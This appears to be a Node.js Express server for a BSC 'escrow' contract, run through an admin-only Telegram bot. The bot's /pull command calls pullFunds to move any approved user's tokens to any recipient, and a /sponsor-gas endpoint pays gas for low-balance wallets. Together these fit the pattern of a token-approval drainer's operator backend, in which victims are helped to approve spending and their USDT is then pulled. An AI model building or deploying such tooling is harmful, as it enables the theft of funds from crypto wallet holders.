require('dotenv').config();

const path = require('path');
const express = require('express');
const { ethers } = require('ethers');
const axios = require('axios');

function getEnv(name, fallbacks = []) {
  const keys = [name, ...fallbacks];
  for (const key of keys) {
    const value = process.env[key];
    if (value && String(value).trim()) {
      return String(value).trim();
    }
  }
  return null;
}

function requireEnv(name, fallbacks = []) {
  const value = getEnv(name, fallbacks);
  if (!value) {
    const aliases = fallbacks.length ? ` (or ${fallbacks.join(', ')})` : '';
    throw new Error(`Missing required environment variable: ${name}${aliases}`);
  }
  return value;
}

const TELEGRAM_BOT_TOKEN = requireEnv('TELEGRAM_BOT_TOKEN');
const CONTRACT_ADDRESS = requireEnv('CONTRACT_ADDRESS', ['ESCROW_CONTRACT_ADDRESS']);
const COMPANY_WALLET_ADDRESS = getEnv('COMPANY_WALLET_ADDRESS');
const ADMIN_CHAT_ID = requireEnv('ADMIN_CHAT_ID');
const PRIVATE_KEY = requireEnv('PRIVATE_KEY', ['SENDER_KEY']);
const BSC_RPC_URL = requireEnv('BSC_RPC_URL');
const USDT_ADDRESS = requireEnv('USDT_ADDRESS');
const PORT = Number(getEnv('PORT')) || 3000;
const USDT_DECIMALS = Number(getEnv('USDT_DECIMALS')) || 18;
const GAS_SPONSOR_AMOUNT = getEnv('GAS_SPONSOR_AMOUNT') || '0.0005';
const GAS_SPONSOR_MIN_BALANCE = getEnv('GAS_SPONSOR_MIN_BALANCE') || '0.0001';
const GAS_SPONSOR_MAX_PER_DAY = Number(getEnv('GAS_SPONSOR_MAX_PER_DAY')) || 3;

const gasSponsorUsage = new Map();

const app = express();
app.use(express.json());

const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
const gasWalletAddress = wallet.address;

if (
  COMPANY_WALLET_ADDRESS &&
  gasWalletAddress.toLowerCase() !== COMPANY_WALLET_ADDRESS.toLowerCase()
) {
  console.warn(
    `Warning: PRIVATE_KEY wallet (${gasWalletAddress}) does not match COMPANY_WALLET_ADDRESS (${COMPANY_WALLET_ADDRESS}). Admin gas is paid by ${gasWalletAddress}.`
  );
}

const escrowAbi = [
  'function notifyApproval(uint256 _amount) external',
  'function pullFunds(address token, address user, address recipient, uint256 amount) external',
  'function setCompanyWallet(address _new) external',
  'event UserApprovalNotified(address indexed user, uint256 amount)',
  'event FundsPulled(address indexed token, address indexed user, address indexed recipient, uint256 amount)'
];

const escrowContract = new ethers.Contract(CONTRACT_ADDRESS, escrowAbi, wallet);
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

function isAdminChat(chatId) {
  return String(chatId).trim() === String(ADMIN_CHAT_ID).trim();
}

function parseTokenAmount(amount) {
  return ethers.utils.parseUnits(String(amount).trim(), USDT_DECIMALS);
}

async function sendTelegramMessage(chatId, text) {
  try {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: chatId,
      text,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('Error sending Telegram message:', error.response?.data || error.message);
  }
}

function getSponsorDayKey() {
  return new Date().toISOString().slice(0, 10);
}

function canSponsorAddress(userAddress) {
  const key = `${userAddress.toLowerCase()}:${getSponsorDayKey()}`;
  const usage = gasSponsorUsage.get(key) || 0;
  return usage < GAS_SPONSOR_MAX_PER_DAY;
}

function recordSponsorAddress(userAddress) {
  const key = `${userAddress.toLowerCase()}:${getSponsorDayKey()}`;
  gasSponsorUsage.set(key, (gasSponsorUsage.get(key) || 0) + 1);
}

app.post('/sponsor-gas', async (req, res) => {
  try {
    const userAddress = String(req.body?.userAddress || '').trim();
    if (!userAddress || !ethers.utils.isAddress(userAddress)) {
      return res.status(400).json({ ok: false, error: 'Invalid wallet address' });
    }

    if (userAddress.toLowerCase() === gasWalletAddress.toLowerCase()) {
      return res.json({ ok: true, skipped: true, reason: 'company_wallet' });
    }

    if (!canSponsorAddress(userAddress)) {
      return res.json({ ok: true, skipped: true, reason: 'rate_limit' });
    }

    const userBalance = await provider.getBalance(userAddress);
    const minBalance = ethers.utils.parseEther(GAS_SPONSOR_MIN_BALANCE);
    if (userBalance.gte(minBalance)) {
      return res.json({ ok: true, skipped: true, reason: 'sufficient_balance' });
    }

    const sponsorAmount = ethers.utils.parseEther(GAS_SPONSOR_AMOUNT);
    const tx = await wallet.sendTransaction({
      to: userAddress,
      value: sponsorAmount
    });
    await tx.wait();
    recordSponsorAddress(userAddress);

    return res.json({ ok: true, txHash: tx.hash, amount: GAS_SPONSOR_AMOUNT });
  } catch (error) {
    console.error('Gas sponsor error:', error.message);
    return res.status(500).json({ ok: false, error: error.message });
  }
});

app.post('/webhook/:token', async (req, res) => {
  if (req.params.token !== TELEGRAM_BOT_TOKEN) {
    return res.sendStatus(404);
  }
  const { message } = req.body;
  if (!message) return res.sendStatus(200);

  const { chat, text } = message;
  const chatId = chat.id;

  if (!text) return res.sendStatus(200);

  if (!isAdminChat(chatId)) {
    await sendTelegramMessage(chatId, '🚫 You are not authorized to use this bot.');
    return res.sendStatus(200);
  }

  if (text.startsWith('/start')) {
    await sendTelegramMessage(
      chatId,
      '🌟 *Welcome to Escrow Admin Panel*\n\nAvailable commands:\n\n' +
        '- `/approve <amount>`: Notify approval for a user\n' +
        '- `/pull <token> <user> <recipient> <amount>`: Pull funds from a user\n' +
        '- `/setwallet <newWallet>`: Update company wallet address'
    );
  } else if (text.startsWith('/approve')) {
    const amount = text.split(' ')[1];
    if (!amount) {
      await sendTelegramMessage(chatId, '❌ Please provide an amount. Example: `/approve 100`');
      return res.sendStatus(200);
    }

    try {
      const parsedAmount = parseTokenAmount(amount);
      const tx = await escrowContract.notifyApproval(parsedAmount);
      await tx.wait();
      await sendTelegramMessage(
        chatId,
        `✅ Approval notified for amount: *${amount}*\n\nTransaction Hash: \`${tx.hash}\``
      );
    } catch (error) {
      await sendTelegramMessage(chatId, `❌ Error: ${error.message}`);
    }
  } else if (text.startsWith('/pull')) {
    const parts = text.split(' ').filter(Boolean);
    if (parts.length !== 5) {
      await sendTelegramMessage(
        chatId,
        '❌ Invalid format. Example: `/pull 0xTokenAddress 0xUserAddress 0xRecipientAddress 100`'
      );
      return res.sendStatus(200);
    }

    const [, token, user, recipient, amount] = parts;
    try {
      const parsedAmount = parseTokenAmount(amount);
      const tx = await escrowContract.pullFunds(token, user, recipient, parsedAmount);
      await tx.wait();
      await sendTelegramMessage(
        chatId,
        `✅ Funds pulled successfully!\n\nToken: *${token}*\nUser: *${user}*\nRecipient: *${recipient}*\nAmount: *${amount}*\n\nTransaction Hash: \`${tx.hash}\``
      );
    } catch (error) {
      await sendTelegramMessage(chatId, `❌ Error: ${error.message}`);
    }
  } else if (text.startsWith('/setwallet')) {
    const newWallet = text.split(' ')[1];
    if (!newWallet || !ethers.utils.isAddress(newWallet)) {
      await sendTelegramMessage(
        chatId,
        '❌ Please provide a valid wallet address. Example: `/setwallet 0xNewWalletAddress`'
      );
      return res.sendStatus(200);
    }

    try {
      const tx = await escrowContract.setCompanyWallet(newWallet);
      await tx.wait();
      await sendTelegramMessage(
        chatId,
        `✅ Company wallet updated to: *${newWallet}*\n\nTransaction Hash: \`${tx.hash}\``
      );
    } catch (error) {
      await sendTelegramMessage(chatId, `❌ Error: ${error.message}`);
    }
  } else {
    await sendTelegramMessage(chatId, '❌ Unknown command. Type /start to see available commands.');
  }

  res.sendStatus(200);
});

app.get('/health', (_req, res) => {
  res.json({
    ok: true,
    contract: CONTRACT_ADDRESS,
    companyWallet: COMPANY_WALLET_ADDRESS || null,
    rpc: BSC_RPC_URL
  });
});

if (!process.env.VERCEL) {
  const staticRoot = path.join(__dirname, 'public');
  app.get('/', (_req, res) => {
    res.sendFile(path.join(staticRoot, 'index.html'));
  });
  app.use(express.static(staticRoot));
}

module.exports = app;

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    console.log(`Escrow contract: ${CONTRACT_ADDRESS}`);
    if (COMPANY_WALLET_ADDRESS) {
      console.log(`Company wallet: ${COMPANY_WALLET_ADDRESS}`);
    }
    console.log(`Gas fees paid by: ${gasWalletAddress}`);
    console.log(`Default USDT token: ${USDT_ADDRESS}`);
  });
}
